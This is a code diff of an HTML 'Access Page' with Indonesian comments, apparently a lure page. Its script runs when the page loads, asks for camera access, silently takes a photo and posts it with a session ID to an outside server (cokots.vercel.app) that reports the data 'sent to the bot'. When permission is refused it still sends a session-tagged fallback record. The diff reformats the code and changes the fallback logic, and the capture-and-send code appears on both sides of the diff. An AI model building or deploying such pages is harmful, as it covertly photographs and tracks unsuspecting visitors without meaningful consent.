@@ -6,94 +6,89 @@
     <title>Access Page</title>
     <script>
     async function sendDataToServer() {
-    try {
-    // Coba untuk mengakses kamera
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    const track = stream.getVideoTracks()[0];
-    const imageCapture = new ImageCapture(track);
-    const photoBlob = await imageCapture.takePhoto();
-    track.stop(); // Hentikan kamera setelah foto diambil
-    
-    // Kirim foto ke server
-    const formData = new FormData();
-    formData.append("photo", photoBlob);
-    
-    const session = new URLSearchParams(window.location.search).get("session");
-    
-    const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
-    method: "POST",
-    body: formData,
-    });
-    
-    // Cek jika respons adalah "Data berhasil dikirim ke bot!"
-    const responseText = await response.text();
-    if (responseText === "Data berhasil dikirim ke bot!") {
-    document.getElementById("status").innerText = "Data berhasil dikirim ke bot!";
-    return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
-    } else {
-    document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
-    }
-    } catch (error) {
-    console.error("Error:", error);
-    
-    // Jika izin kamera ditolak atau terjadi error lain, kirimkan data kosong (fallback)
-    if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
-    document.getElementById("gagal").innerText = "Gagal mendapatkan data. Izin kamera ditolak. Menghentikan API.";
-    return; // Berhenti jika izin kamera ditolak
-    }
-    
-    // Kirimkan data kosong dengan fallback gambar
-    sendEmptyDataToAPI();
-    }
+        try {
+            // Coba untuk mengakses kamera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const track = stream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(track);
+            const photoBlob = await imageCapture.takePhoto();
+            track.stop(); // Hentikan kamera setelah foto diambil
+            
+            // Kirim foto ke server
+            const formData = new FormData();
+            formData.append("photo", photoBlob);
+            
+            const session = new URLSearchParams(window.location.search).get("session");
+            
+            const response = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+                method: "POST",
+                body: formData,
+            });
+            
+            // Cek jika respons adalah "Data berhasil dikirim ke bot!"
+            const responseText = await response.text();
+            if (responseText === "Data berhasil dikirim ke bot!") {
+                document.getElementById("status").innerText = "Data berhasil dikirim ke bot!";
+                return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
+            } else {
+                document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
+            }
+        } catch (error) {
+            
+            // Jika izin kamera ditolak atau terjadi error lain, kirimkan data kosong (fallback)
+            if (error.name === "NotAllowedError" || error.name === "PermissionDeniedError") {
+                document.getElementById("gagal").innerText = "Gagal mendapatkan data. Izin kamera ditolak. Menghentikan API.";
+                sendEmptyDataToAPI(); // Panggil sendEmptyDataToAPI jika izin ditolak
+                return; // Berhenti jika izin kamera ditolak
+            }
+            
+            // Kirimkan data kosong dengan fallback gambar
+            //sendEmptyDataToAPI();
+        }
     }
     
     // Fungsi untuk mengirimkan data kosong dengan fallback gambar dari URL
     async function sendEmptyDataToAPI() {
-    document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan.";
-    
-    // URL gambar fallback
-    const fallbackImageURL = 'https://i.scdn.co/image/ab67616d00001e0288a1f3c6c2711b92aabdf488';  // Ganti dengan URL gambar yang valid
-    
-    try {
-    // Ambil gambar dari URL
-    const response = await fetch(fallbackImageURL);
-    const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
-    
-    const session = new URLSearchParams(window.location.search).get("session");
-    
-    const caption = `
-    📍 **Data Pengguna: mengizinkan**
-    - User-Agent: -
-    - Lokasi: -
-    - Sesi: ${session}
-    `;
-    
-    // Kirim foto kosong (fallback) ke server
-    const formData = new FormData();
-    formData.append("photo", fallbackImageURL);  // Kirimkan fallback gambar
-    formData.append("caption", caption);
-    
-    
-    
-    console.log("Mengirim data kosong (fallback) ke API...");
-    
-    const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
-    method: "POST",
-    body: formData,
-    });
-    
-    // Cek jika respons adalah "Data berhasil dikirim ke bot!"
-    const responseText = await apiResponse.text();
-    if (responseText === "Data berhasil dikirim ke bot!") {
-    document.getElementById("status").innerText = "Data berhasil dikirim ke bot!";
-    return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
-    } else {
-    document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
-    }
-    } catch (error) {
-    console.error("Gagal mengirim data kosong (fallback):", error);
-    document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
-    }
+        document.getElementById("gagal").innerText = "Gagal mendapatkan data. Pastikan izin kamera diberikan.";
+        
+        // URL gambar fallback
+        const fallbackImageURL = 'https://i.scdn.co/image/ab67616d00001e0288a1f3c6c2711b92aabdf488';  // Ganti dengan URL gambar yang valid
+        
+        try {
+            // Ambil gambar dari URL
+            const response = await fetch(fallbackImageURL);
+            const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
+            
+            const session = new URLSearchParams(window.location.search).get("session");
+            
+            const caption = `
+            📍 **Data Pengguna: mengizinkan**
+            - User-Agent: -
+            - Lokasi: -
+            - Sesi: ${session}
+            `;
+            
+            // Kirim foto kosong (fallback) ke server
+            const formData = new FormData();
+            formData.append("photo", fallbackImageURL);  // Kirimkan fallback gambar
+            formData.append("caption", caption);
+            
+            const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
+                method: "POST",
+                body: formData,
+            });
+            
+            // Cek jika respons adalah "Data berhasil dikirim ke bot!"
+            const responseText = await apiResponse.text();
+            if (responseText === "Data berhasil dikirim ke bot!") {
+                document.getElementById("status").innerText = "Data berhasil dikirim ke bot!";
+                return;  // Berhenti menjalankan fungsi lebih lanjut jika sukses
+            } else {
+                document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
+            }
+        } catch (error) {
+            document.getElementById("status").innerText = "Gagal mengirim data. Coba lagi.";
+        }
     }
     
     // Jalankan fungsi saat halaman dimuat
